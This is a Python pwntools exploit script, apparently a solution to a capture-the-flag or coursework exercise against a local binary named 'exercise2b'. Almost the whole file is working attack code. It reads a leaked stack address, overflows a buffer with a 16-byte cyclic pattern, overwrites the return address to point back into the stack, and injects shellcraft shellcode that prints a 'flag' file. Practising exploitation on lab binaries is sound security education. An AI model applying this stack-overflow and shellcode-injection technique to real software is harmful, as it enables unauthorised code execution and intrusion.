#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from pwnlib.term.readline import readline

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

v1_addr_raw = r.recvline().decode().strip()
print('WHYTF ' + v1_addr_raw)
v1_addr =  int(v1_addr_raw, 16)

LEN_TO_RET_ADDR = 16

read_flag = shellcraft.amd64.linux.cat('flag', fd=1)
print(read_flag)
read_flag = asm(read_flag)

# print(read_flag)
sc = cyclic(LEN_TO_RET_ADDR)
sc += pack(v1_addr + 24, 64)
sc += read_flag


r.sendline(sc)
pause(3)
a = r.recvall()
print(a)
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

